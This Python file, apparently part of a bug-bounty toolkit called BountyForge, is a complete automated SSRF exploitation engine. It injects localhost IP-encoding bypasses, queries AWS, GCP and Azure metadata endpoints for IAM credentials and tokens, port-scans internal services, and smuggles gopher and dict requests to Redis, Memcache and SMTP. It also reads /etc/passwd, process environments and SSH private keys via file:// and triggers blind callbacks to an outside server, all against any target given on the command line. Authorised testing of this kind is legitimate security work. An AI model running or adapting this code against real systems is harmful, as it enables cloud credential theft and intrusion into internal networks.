#!/usr/bin/env python3
"""
BountyForge SSRF Engine — Full SSRF exploitation pipeline.

Pipeline:
  1. Basic SSRF payloads (12 IP representations of 127.0.0.1)
  2. Cloud metadata endpoint probing (AWS, GCP, Azure, Alibaba, DigitalOcean)
  3. Internal port scanning via SSRF (22, 80, 443, 3306, 5432, 6379, 8080, etc.)
  4. DNS rebinding using nip.io / xip.io / sslip.io
  5. Protocol smuggling (gopher://, file://, dict://, ftp://)
  6. Blind SSRF detection via callback server

Usage (library):
  engine = SSRFEngine(http_pool, callback_server, waf_detector, state_dir)
  findings = await engine.run(urls, injectable_params)

Usage (standalone):
  python3 tools/ssrf_engine.py --target example.com --param url
"""

import asyncio
import hashlib
import json
import os
import re
import secrets
import socket
import sys
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

try:
    from tools.http_pool import HTTPPool, HTTPResult
    from tools.callback_server import CallbackServer
    from tools.waf_detector import WafDetector, WafInfo
    HAS_DEPS = True
except ImportError:
    HAS_DEPS = False

try:
    from tools.payload_loader import PayloadLoader
    HAS_PAYLOADS = True
except ImportError:
    HAS_PAYLOADS = False


# ── Finding data class ─────────────────────────────────────

@dataclass
class SSRFinding:
    id: str = ""
    type: str = "ssrf"
    severity: str = "high"
    title: str = ""
    url: str = ""
    param: str = ""
    payload: str = ""
    evidence: str = ""
    source: str = "ssrf_engine"
    timestamp: float = 0.0
    reproducible: bool = True
    chain_id: str = ""
    cvss_score: float = 0.0

    def __post_init__(self):
        if not self.id:
            raw = f"{self.url}|{self.param}|{self.payload}|{self.type}"
            self.id = hashlib.sha256(raw.encode()).hexdigest()[:16]
        if not self.timestamp:
            self.timestamp = time.time()
        if not self.cvss_score:
            self.cvss_score = {
                "ssrf": 8.6, "ssrf-cloud-metadata": 9.8,
                "ssrf-internal-scan": 7.5, "ssrf-protocol-smuggle": 8.0,
                "ssrf-blind": 7.5, "ssrf-dns-rebind": 7.0,
            }.get(self.type, 7.5)

    def to_dict(self) -> Dict:
        return asdict(self)


# ── SSRF Engine ────────────────────────────────────────────

class SSRFEngine:
    """
    Full SSRF exploitation pipeline.

    Tests every injectable parameter with:
    - 12 IP representations (bypass IP filtering)
    - 10+ cloud metadata endpoints
    - 15+ common internal ports
    - DNS rebinding services
    - Protocol smuggling (gopher, file, dict, ftp)
    - Blind callbacks for out-of-band detection
    """

    # 12 different ways to represent 127.0.0.1 (bypass IP blacklists)
    LOCALHOST_PAYLOADS = [
        ("http://127.0.0.1:80", "Dotted quad"),
        ("http://127.0.0.1:443", "Dotted quad HTTPS"),
        ("http://127.0.0.1:8080", "Common dev port"),
        ("http://localhost:80", "Hostname"),
        ("http://[::1]:80", "IPv6 loopback"),
        ("http://0.0.0.0:80", "Wildcard IP"),
        ("http://0:80", "Shorthand zero"),
        ("http://0177.0.0.1:80", "Octal encoding"),
        ("http://2130706433:80", "Decimal integer"),
        ("http://0x7f000001:80", "Hex encoding"),
        ("http://127.1:80", "Shorthand dotted"),
        ("http://127.0.0.1.nip.io:80", "DNS rebind service"),
    ]

    # Cloud metadata endpoints for all major providers
    CLOUD_METADATA_ENDPOINTS = [
        # AWS EC2 (IMDSv1)
        ("http://169.254.169.254/latest/meta-data/", "AWS metadata root"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM role"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/admin", "AWS IAM admin role"),
        ("http://169.254.169.254/latest/user-data/", "AWS user-data"),
        ("http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key", "AWS SSH key"),
        # GCP
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata root"),
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP token"),
        ("http://metadata.google.internal/computeMetadata/v1/project/", "GCP project info"),
        # Azure
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure instance metadata"),
        ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure managed identity token"),
        # Alibaba Cloud
        ("http://100.100.100.200/latest/meta-data/", "Alibaba metadata root"),
        ("http://100.100.100.200/latest/meta-data/ram/security-credentials/", "Alibaba RAM role"),
        # DigitalOcean
        ("http://169.254.169.254/metadata/v1.json", "DigitalOcean metadata"),
        # Oracle Cloud
        ("http://169.254.169.254/opc/v1/instance/", "Oracle Cloud metadata"),
        # Kubernetes
        ("http://169.254.169.254/latest/meta-data/kube-env", "Kubernetes on cloud"),
    ]

    # Common internal ports for SSRF port scanning
    INTERNAL_PORTS = [
        (22, "SSH"),
        (25, "SMTP"),
        (53, "DNS"),
        (80, "HTTP"),
        (110, "POP3"),
        (143, "IMAP"),
        (443, "HTTPS"),
        (993, "IMAPS"),
        (995, "POP3S"),
        (3306, "MySQL"),
        (3389, "RDP"),
        (5432, "PostgreSQL"),
        (6379, "Redis"),
        (8080, "HTTP Alt"),
        (8443, "HTTPS Alt"),
        (9200, "Elasticsearch"),
        (11211, "Memcache"),
        (27017, "MongoDB"),
    ]

    # Protocol smuggling payloads
    PROTOCOL_PAYLOADS = [
        ("gopher://127.0.0.1:6379/_INFO%0D%0AQUIT%0D%0A", "gopher:// Redis"),
        ("gopher://127.0.0.1:11211/_stats%0D%0A", "gopher:// Memcache"),
        ("gopher://127.0.0.1:25/_EHLO%20test%0D%0A", "gopher:// SMTP"),
        ("file:///etc/passwd", "file:// passwd"),
        ("file:///etc/hosts", "file:// hosts"),
        ("file:///proc/self/environ", "file:// proc environ"),
        ("file:///home/sandbox/.ssh/id_rsa", "file:// SSH key"),
        ("dict://127.0.0.1:6379/info", "dict:// Redis info"),
        ("dict://127.0.0.1:11211/stats", "dict:// Memcache stats"),
        ("ftp://ftp@127.0.0.1:21/", "ftp:// connect"),
        # Windows targets
        ("file:///C:/Windows/System32/drivers/etc/hosts", "file:// Windows hosts"),
        ("file:///C:/Windows/win.ini", "file:// Windows win.ini"),
    ]

    # Known injectable parameter names
    INJECTABLE_PARAMS = [
        "url", "uri", "path", "src", "source", "target", "link",
        "redirect", "redirect_uri", "redirect_url", "return", "return_url",
        "next", "continue", "callback", "webhook", "endpoint",
        "image_url", "img_url", "avatar", "thumbnail", "icon",
        "file", "file_url", "document", "import", "export",
        "proxy", "fetch", "download", "upload", "load",
        "feed", "rss", "api_url", "service_url", "host",
        "domain", "site", "website", "origin", "dest", "destination",
        "back", "goto", "forward", "forward_url", "u", "r",
        "open", "external", "remote", "request", "ping",
        "test", "validate", "check", "verify",
    ]

    def __init__(
        self,
        http_pool: HTTPPool,
        callback_server=None,
        waf_detector=None,
        state_dir: str = None,
    ):
        self.http_pool = http_pool
        self.callback = callback_server
        self.waf = waf_detector
        self.state_dir = state_dir or os.path.join(
            os.environ.get("BF_STATE_DIR", str(ROOT / "state")),
            "bus",
        )
        self.payload_loader = None
        if HAS_PAYLOADS:
            try:
                self.payload_loader = PayloadLoader()
                if self.payload_loader.is_available:
                    self.payload_loader.index()
            except Exception:
                pass

    def _enrich_payloads_from_repo(self):
        """Pull additional SSRF payloads from PayloadsAllTheThings."""
        if not self.payload_loader or not self.payload_loader.is_available:
            return [], [], []

        # Extra localhost bypasses
        extra_localhost = []
        for block in self.payload_loader.payloads(
            'Server Side Request Forgery', 'Bypass'
        )[:30]:
            for line in block.code.split('\n'):
                line = line.strip()
                if any(p in line.lower() for p in ['http://', 'https://', '://']):
                    if len(line) < 500:
                        extra_localhost.append(line)

        # Extra cloud metadata endpoints
        extra_cloud = []
        for block in self.payload_loader.payloads(
            'Server Side Request Forgery', 'Cloud'
        ):
            for line in block.code.split('\n'):
                line = line.strip()
                if '169.254' in line or 'metadata' in line.lower():
                    extra_cloud.append(line)

        # Extra protocol / URL scheme payloads
        extra_protocols = []
        for block in self.payload_loader.payloads(
            'Server Side Request Forgery', 'URL Scheme'
        ):
            extra_protocols.append(block.code[:2000])

        return extra_localhost, extra_cloud, extra_protocols

    # ── Main entry point ───────────────────────────────────

    async def run(
        self,
        urls: List[str],
        params: List[str] = None,
        headers: Dict[str, str] = None,
        max_urls: int = 50,
    ) -> List[SSRFinding]:
        """
        Run the full SSRF pipeline against all provided URLs and parameters.

        Args:
            urls: List of URLs to test
            params: Specific parameter names to test (auto-discovered if None)
            headers: Custom headers for requests
            max_urls: Maximum URLs to test (limits scan scope)

        Returns:
            List of SSRFinding objects
        """
        all_findings: List[SSRFinding] = []

        # Filter to URLs with injectable params
        candidates = self._filter_injectable(urls, params, max_urls)
        if not candidates:
            # If no URLs have known injectable params, test common ones
            candidates = self._add_common_params(urls[:max_urls])

        print(f"[ssrf] Testing {len(candidates)} URLs with {len(self.LOCALHOST_PAYLOADS)} bypass payloads")

        # Detect WAF first (if detector available)
        waf_info = None
        if self.waf:
            try:
                target_domain = urlparse(urls[0]).hostname if urls else ""
                if target_domain:
                    waf_info = await self.waf.detect(target_domain)
                    print(f"[ssrf] WAF detected: {waf_info.name} (blocks={waf_info.blocking_level})")
            except Exception as e:
                print(f"[ssrf] WAF detection failed: {e}")

        # Phase 1: Basic SSRF payloads
        for url, param in candidates:
            findings = await self.test_basic(url, param, headers, waf_info)
            all_findings.extend(findings)

        # Phase 2: Cloud metadata probing
        for url, param in candidates[:10]:  # Limit to top 10 for cloud metadata
            findings = await self.test_cloud_metadata(url, param, headers, waf_info)
            all_findings.extend(findings)

        # Phase 3: Internal port scanning
        if len(candidates) <= 5:
            for url, param in candidates:
                findings = await self.port_scan(url, param, headers, waf_info)
                all_findings.extend(findings)

        # Phase 4: Protocol smuggling
        for url, param in candidates[:5]:
            findings = await self.test_protocol_smuggle(url, param, headers, waf_info)
            all_findings.extend(findings)

        # Phase 5: DNS rebinding (if callback server available)
        if self.callback:
            for url, param in candidates[:5]:
                findings = await self.test_dns_rebind(url, param, headers)
                all_findings.extend(findings)

        # Deduplicate
        unique = self._deduplicate(all_findings)
        print(f"[ssrf] Complete: {len(unique)} unique findings from {len(all_findings)} total signals")

        return unique

    # ── Phase 1: Basic SSRF ────────────────────────────────

    async def test_basic(
        self,
        url: str,
        param: str,
        headers: Dict = None,
        waf_info=None,
    ) -> List[SSRFinding]:
        """Test all 12 localhost payloads against a single parameter."""
        findings = []

        # Get baseline (empty param value)
        baseline = await self.http_pool.request("GET", url, headers=headers)

        for payload, desc in self.LOCALHOST_PAYLOADS:
            test_url = self._inject_param(url, param, payload)

            # Apply WAF bypass headers if available
            req_headers = dict(headers or {})
            if waf_info and waf_info.bypasses:
                for bypass in waf_info.bypasses[:2]:
                    req_headers.update(bypass.get("headers", {}))

            result = await self.http_pool.request("GET", test_url, headers=req_headers)

            # Skip if WAF blocked
            if self.http_pool.is_waf_block(result):
                continue

            # Check if payload reached an internal resource
            if self.http_pool.is_internal_response(result, baseline):
                findings.append(SSRFinding(
                    type="ssrf",
                    severity="high",
                    title=f"SSRF via {param} — {desc}",
                    url=url,
                    param=param,
                    payload=payload,
                    evidence=f"Status: {result.status}, Body: {result.body[:300]}",
                ))
                break  # One finding per param+url is enough for basics

            # Check for blind SSRF via callback
            if self.callback:
                token = self.callback.generate_payload_token("ssrf-basic")
                cb_url = f"http://{self.callback.host}:{self.callback.port}/{token}"
                test_url_cb = self._inject_param(url, param, cb_url)
                await self.http_pool.request("GET", test_url_cb, headers=req_headers)
                await asyncio.sleep(0.5)
                if self.callback.check_by_token(token):
                    findings.append(SSRFinding(
                        type="ssrf-blind",
                        severity="medium",
                        title=f"Blind SSRF via {param} — callback received",
                        url=url,
                        param=param,
                        payload=cb_url,
                        evidence="Callback received from target server",
                    ))

        return findings

    # ── Phase 2: Cloud Metadata ────────────────────────────

    async def test_cloud_metadata(
        self,
        url: str,
        param: str,
        headers: Dict = None,
        waf_info=None,
    ) -> List[SSRFinding]:
        """Probe all cloud metadata endpoints through a single parameter."""
        findings = []

        for meta_url, desc in self.CLOUD_METADATA_ENDPOINTS:
            # For GCP, add required header
            req_headers = dict(headers or {})
            if "metadata.google.internal" in meta_url:
                req_headers["Metadata-Flavor"] = "Google"

            test_url = self._inject_param(url, param, meta_url)
            result = await self.http_pool.request("GET", test_url, headers=req_headers)

            if self.http_pool.is_waf_block(result):
                continue

            if self.http_pool.is_metadata_response(result):
                findings.append(SSRFinding(
                    type="ssrf-cloud-metadata",
                    severity="critical",
                    title=f"SSRF to {desc} — cloud metadata exposed",
                    url=url,
                    param=param,
                    payload=meta_url,
                    evidence=result.body[:500],
                ))
                break  # One hit is enough for critical

        return findings

    # ── Phase 3: Internal Port Scan ────────────────────────

    async def port_scan(
        self,
        url: str,
        param: str,
        headers: Dict = None,
        waf_info=None,
        ports: List[Tuple[int, str]] = None,
        concurrency: int = 5,
    ) -> List[SSRFinding]:
        """
        Internal port scanning via SSRF.
        Tests common ports by measuring differences in response timing and content.
        """
        target_ports = ports or self.INTERNAL_PORTS
        findings = []

        # Get baseline timing (request with no port / known-open port 80)
        baseline = await self.http_pool.request("GET", url, headers=headers)
        base_time = baseline.duration_ms

        sem = asyncio.Semaphore(concurrency)

        async def probe_port(port: int, service: str) -> Tuple[int, str, float, int, str]:
            async with sem:
                payload = f"http://127.0.0.1:{port}"
                test_url = self._inject_param(url, param, payload)
                start = time.monotonic()
                result = await self.http_pool.request("GET", test_url, headers=headers)
                elapsed = (time.monotonic() - start) * 1000
                return port, service, elapsed, result.status, result.body[:200]

        tasks = [probe_port(p, s) for p, s in target_ports]
        port_results = await asyncio.gather(*tasks)

        open_ports = []
        for port, service, elapsed, status, body in port_results:
            # Heuristics for detecting open ports:
            # 1. Significantly different response time (> 2x baseline or > 500ms difference)
            # 2. Different response content from common closed-port responses
            # 3. Specific service banners in response
            time_signal = elapsed > base_time * 2 and (elapsed - base_time) > 500

            service_indicators = {
                6379: ["redis", "-ERR", "+OK", "+PONG"],
                11211: ["STAT", "VERSION", "memcache"],
                3306: ["mysql", "caching_sha2_password", "mysql_native_password"],
                5432: ["postgresql", "FATAL"],
                9200: ["elasticsearch", "cluster_name", "lucene_version"],
                27017: ["mongod", "MongoDB"],
            }
            indicators = service_indicators.get(port, [])
            content_signal = any(ind.lower() in body.lower() for ind in indicators)

            if time_signal or content_signal or status != baseline.status:
                open_ports.append((port, service))

        if open_ports:
            findings.append(SSRFinding(
                type="ssrf-internal-scan",
                severity="high",
                title=f"SSRF internal port scan — {len(open_ports)} open ports",
                url=url,
                param=param,
                payload=f"Scanned {len(target_ports)} ports",
                evidence=f"Open: {', '.join(f'{p} ({s})' for p, s in open_ports)}",
            ))

        return findings

    # ── Phase 4: DNS Rebinding ─────────────────────────────

    async def test_dns_rebind(
        self,
        url: str,
        param: str,
        headers: Dict = None,
    ) -> List[SSRFinding]:
        """Test DNS rebinding via nip.io, xip.io, sslip.io services."""
        if not self.callback:
            return []

        findings = []
        token = self.callback.generate_payload_token("rebind")

        rebind_payloads = [
            f"http://127.0.0.1.nip.io:{self.callback.port}/{token}",
            f"http://127.0.0.1.xip.io:{self.callback.port}/{token}",
            f"http://127-0-0-1.sslip.io:{self.callback.port}/{token}",
            f"http://localtest.me:{self.callback.port}/{token}",
        ]

        for payload in rebind_payloads:
            test_url = self._inject_param(url, param, payload)
            await self.http_pool.request("GET", test_url, headers=headers)

        # Wait briefly and check callbacks
        await asyncio.sleep(1)
        matches = self.callback.get_callbacks(token=token)

        if matches:
            findings.append(SSRFinding(
                type="ssrf-dns-rebind",
                severity="high",
                title=f"SSRF DNS rebinding via {param}",
                url=url,
                param=param,
                payload=rebind_payloads[0],
                evidence=f"DNS rebinding callback received: {matches[0].summary}",
            ))

        return findings

    # ── Phase 5: Protocol Smuggling ────────────────────────

    async def test_protocol_smuggle(
        self,
        url: str,
        param: str,
        headers: Dict = None,
        waf_info=None,
    ) -> List[SSRFinding]:
        """Test protocol smuggling (gopher://, file://, dict://, ftp://)."""
        findings = []

        # Get baseline
        baseline = await self.http_pool.request("GET", url, headers=headers)

        for payload, desc in self.PROTOCOL_PAYLOADS:
            test_url = self._inject_param(url, param, payload)
            result = await self.http_pool.request("GET", test_url, headers=headers)

            if self.http_pool.is_waf_block(result):
                continue

            # Check for successful protocol smuggling
            # file:// success: contains file contents
            if payload.startswith("file://"):
                file_indicators = ["root:", "daemon:", "nobody:", "[boot loader]",
                                   "localhost", "127.0.0.1", "::1"]
                if any(ind.lower() in result.body.lower() for ind in file_indicators):
                    findings.append(SSRFinding(
                        type="ssrf-protocol-smuggle",
                        severity="critical",
                        title=f"SSRF protocol smuggling — {desc}",
                        url=url,
                        param=param,
                        payload=payload,
                        evidence=result.body[:500],
                    ))
                    break  # Critical finding — stop

            # gopher:// success: Redis/Memcache response
            if payload.startswith("gopher://"):
                redis_indicators = ["-ERR", "+OK", "redis_version", "# Server"]
                memcache_indicators = ["STAT", "VERSION"]
                smtp_indicators = ["220 ", "250 ", "ESMTP"]
                if any(ind.lower() in result.body.lower() for ind in redis_indicators + memcache_indicators + smtp_indicators):
                    findings.append(SSRFinding(
                        type="ssrf-protocol-smuggle",
                        severity="critical",
                        title=f"SSRF protocol smuggling — internal service reachable via {desc}",
                        url=url,
                        param=param,
                        payload=payload,
                        evidence=result.body[:500],
                    ))
                    break

            # dict:// success: protocol response
            if payload.startswith("dict://"):
                if any(ind in result.body for ind in ["+OK", "-ERR", "STAT", "VERSION"]):
                    findings.append(SSRFinding(
                        type="ssrf-protocol-smuggle",
                        severity="high",
                        title=f"SSRF protocol smuggling — dict:// protocol accepted via {param}",
                        url=url,
                        param=param,
                        payload=payload,
                        evidence=result.body[:300],
                    ))

            # Generic: response differs significantly from baseline
            if self.http_pool.is_internal_response(result, baseline):
                findings.append(SSRFinding(
                    type="ssrf-protocol-smuggle",
                    severity="medium",
                    title=f"SSRF protocol smuggling — response anomaly via {desc}",
                    url=url,
                    param=param,
                    payload=payload,
                    evidence=f"Status: {result.status}, Differs from baseline ({baseline.status})",
                ))

        return findings

    # ── Helpers ────────────────────────────────────────────

    def _filter_injectable(
        self,
        urls: List[str],
        params: List[str] = None,
        max_urls: int = 50,
    ) -> List[Tuple[str, str]]:
        """Filter URLs to those with injectable parameters. Returns (url, param) pairs."""
        candidates = []

        for url in urls[:max_urls]:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)

            # Check existing query params
            for pname in query_params:
                if params is None or pname.lower() in [pp.lower() for pp in params]:
                    candidates.append((url, pname))
                elif pname.lower() in self.INJECTABLE_PARAMS:
                    candidates.append((url, pname))

            # Also consider path-based parameter injection
            # e.g., /fetch/URL → we can inject at the end
            if not query_params:
                for pname in (params or self.INJECTABLE_PARAMS[:5]):
                    test_url = f"{url}?{pname}=test"
                    candidates.append((test_url, pname))

        return candidates[:max_urls]

    def _add_common_params(self, urls: List[str]) -> List[Tuple[str, str]]:
        """Add common injectable params to URLs that don't have them."""
        candidates = []
        for url in urls:
            for param in self.INJECTABLE_PARAMS[:10]:
                test_url = f"{url}?{param}=https://example.com"
                candidates.append((test_url, param))
        return candidates

    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject a parameter value into a URL. Handles both existing and new params."""
        parsed = urlparse(url)
        query = parse_qs(parsed.query, keep_blank_values=True)

        # URL-encode the value unless it's a protocol prefix
        if not any(value.startswith(p) for p in ["http://", "https://", "gopher://", "dict://", "file://", "ftp://"]):
            from urllib.parse import quote
            value = quote(value, safe='')

        query[param] = [value]
        new_query = urlencode(query, doseq=True)
        new_parsed = parsed._replace(query=new_query)
        return urlunparse(new_parsed)

    def _deduplicate(self, findings: List[SSRFinding]) -> List[SSRFinding]:
        """Deduplicate findings by URL + param + type."""
        seen = set()
        unique = []
        for f in findings:
            key = f"{f.url}|{f.param}|{f.type}"
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique


# ── CLI ────────────────────────────────────────────────────

async def main():
    import argparse
    parser = argparse.ArgumentParser(description="BountyForge SSRF Engine")
    parser.add_argument("--target", required=True, help="Target domain or URL")
    parser.add_argument("--param", help="Specific parameter to test")
    parser.add_argument("--urls-file", help="File with URLs to test (one per line)")
    parser.add_argument("--basic-only", action="store_true", help="Only basic SSRF payloads")
    parser.add_argument("--cloud-only", action="store_true", help="Only cloud metadata")
    parser.add_argument("--port-scan", action="store_true", help="Run internal port scan")
    parser.add_argument("--output", help="Output file for findings (JSON)")
    args = parser.parse_args()

    from tools.http_pool import HTTPPool

    pool = HTTPPool(max_connections=30, timeout=15)
    await pool.start()

    engine = SSRFEngine(pool)

    urls = []
    if args.urls_file:
        urls = [l.strip() for l in Path(args.urls_file).read_text().splitlines() if l.strip()]
    else:
        base = args.target if args.target.startswith("http") else f"https://{args.target}"
        if args.param:
            urls = [f"{base}?{args.param}=test"]
        else:
            urls = [f"{base}?url=test", f"{base}?redirect=test", f"{base}?callback=test"]

    params = [args.param] if args.param else None

    print(f"[*] BountyForge SSRF Engine")
    print(f"[*] Target: {args.target}")
    print(f"[*] URLs: {len(urls)}")

    findings = []
    for url, param in engine._filter_injectable(urls, params):
        if args.basic_only:
            findings.extend(await engine.test_basic(url, param))
        elif args.cloud_only:
            findings.extend(await engine.test_cloud_metadata(url, param))
        elif args.port_scan:
            findings.extend(await engine.port_scan(url, param))
        else:
            findings.extend(await engine.run([url], [param]))

    print(f"\n[*] Findings: {len(findings)}")
    for f in findings:
        print(f"  [{f.severity}] {f.title}")
        print(f"    Payload: {f.payload}")
        print(f"    Evidence: {f.evidence[:100]}")

    # Persist confirmed findings to the state bus (read by orchestrator, kill_chain, report upload)
    if findings:
        try:
            from tools.bus_writer import save_findings
            save_findings(args.target, [f.to_dict() for f in findings], "ssrf_engine")
        except Exception as e:
            print(f"[!] state bus write failed: {e}")

    if args.output:
        Path(args.output).write_text(json.dumps([f.to_dict() for f in findings], indent=2))
        print(f"[*] Results written to {args.output}")

    await pool.stop()


if __name__ == "__main__":
    asyncio.run(main())
